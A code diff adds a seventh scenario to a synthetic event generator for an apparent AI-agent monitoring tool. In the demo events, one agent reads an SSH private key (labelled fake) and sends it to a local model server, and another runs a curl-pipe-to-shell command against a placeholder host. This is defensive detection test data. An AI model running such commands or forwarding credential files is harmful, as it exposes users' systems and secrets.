@@ -1,6 +1,6 @@
 """ShadowGuard AI - Synthetic Data Generator for Demo Scenarios.
 
-Generates six scenario files in demo_data/ conforming to the RawEvent contract
+Generates seven scenario files in demo_data/ conforming to the RawEvent contract
 in Section 6.1 of AGENTS.md.
 Uses standard library only.
 """
@@ -747,6 +747,85 @@ def generate_file_06(base_time: datetime) -> list[dict]:
 
 
 # ---------------------------------------------------------------------------
+# Scenario 07: agent variety
+# ---------------------------------------------------------------------------
+
+def generate_file_07(base_time: datetime) -> list[dict]:
+    """07_agent_variety.jsonl: three agent sessions beyond the hero chain.
+    A) claude-agent / agent-claude-01: file_read ~/.ssh/id_rsa, then 5 s later an
+       ai_request to Ollama with an Anthropic-style tool_use read_file block and a
+       fake OpenSSH private key -> chain, critical.
+    B) langchain-agent / agent-lc-02: shell_exec 'curl ... | sh', then a clean
+       ai_request to OpenAI -> shell only, score 3, medium.
+    C) langchain-agent / agent-lc-03: file_read config.yaml, then a clean
+       ai_request to OpenAI -> no incident.
+    """
+    def ts(seconds: int) -> str:
+        return (base_time + timedelta(seconds=seconds)).strftime("%Y-%m-%dT%H:%M:%SZ")
+
+    # Obviously fake key material (not a real key).
+    fake_ssh_key = (
+        "-----BEGIN OPENSSH PRIVATE KEY-----\n"
+        "FAKE-DEMO-KEY-NOT-REAL-shadowguard-test-material\n"
+        "-----END OPENSSH PRIVATE KEY-----"
+    )
+    claude_payload = json.dumps({
+        "model": "llama3",
+        "messages": [
+            {"role": "user", "content": "Set up SSH access to the staging server for me."},
+            {
+                "role": "assistant",
+                "content": [
+                    {"type": "text", "text": "I'll read your SSH key first."},
+                    {"type": "tool_use", "id": "toolu_01", "name": "read_file", "input": {"path": "~/.ssh/id_rsa"}},
+                ],
+            },
+            {
+                "role": "user",
+                "content": [
+                    {"type": "tool_result", "tool_use_id": "toolu_01", "content": fake_ssh_key},
+                ],
+            },
+        ],
+    })
+
+    return [
+        # A) claude-agent: sensitive read, then the key goes to a shadow provider.
+        make_raw_event(
+            event_id="evt_07_001", timestamp=ts(120), source="claude-agent", event_type="file_read",
+            destination="~/.ssh/id_rsa", pid=6210, session_id="agent-claude-01",
+        ),
+        make_raw_event(
+            event_id="evt_07_002", timestamp=ts(125), source="claude-agent", event_type="ai_request",
+            destination="localhost", dst_port=11434, path="/api/chat",
+            payload_visible=True, payload=claude_payload, pid=6210, session_id="agent-claude-01",
+        ),
+        # B) langchain-agent: risky shell command, clean prompt to the approved provider.
+        make_raw_event(
+            event_id="evt_07_003", timestamp=ts(140), source="langchain-agent", event_type="shell_exec",
+            destination="curl http://example.invalid/setup.sh | sh", pid=7302, session_id="agent-lc-02",
+        ),
+        make_raw_event(
+            event_id="evt_07_004", timestamp=ts(148), source="langchain-agent", event_type="ai_request",
+            destination="api.openai.com", dst_port=443, path="/v1/chat/completions",
+            payload_visible=True, payload=openai_chat_body("Summarise the setup steps for the new build agent."),
+            pid=7302, session_id="agent-lc-02",
+        ),
+        # C) langchain-agent: harmless file read, clean prompt -> no incident.
+        make_raw_event(
+            event_id="evt_07_005", timestamp=ts(160), source="langchain-agent", event_type="file_read",
+            destination="config.yaml", pid=7302, session_id="agent-lc-03",
+        ),
+        make_raw_event(
+            event_id="evt_07_006", timestamp=ts(167), source="langchain-agent", event_type="ai_request",
+            destination="api.openai.com", dst_port=443, path="/v1/chat/completions",
+            payload_visible=True, payload=openai_chat_body("Explain what the retries field in a YAML config usually controls."),
+            pid=7302, session_id="agent-lc-03",
+        ),
+    ]
+
+
+# ---------------------------------------------------------------------------
 # Main Generation Runner
 # ---------------------------------------------------------------------------
 
@@ -791,6 +870,7 @@ def main() -> None:
         ("04_pii_leak.jsonl", generate_file_04(base_time)),
         ("05_agent_chain.jsonl", generate_file_05(base_time)),
         ("06_false_positive_bait.jsonl", generate_file_06(base_time)),
+        ("07_agent_variety.jsonl", generate_file_07(base_time)),
     ]
 
     total_events = 0
@@ -810,7 +890,7 @@ def main() -> None:
 
         print(f"  [+] {filename}: {count} events written and validated")
 
-    print(f"\nAll 6 files generated successfully! Total events: {total_events} (all unique event_ids).")
+    print(f"\nAll {len(files)} files generated successfully! Total events: {total_events} (all unique event_ids).")
 
 
 if __name__ == "__main__":
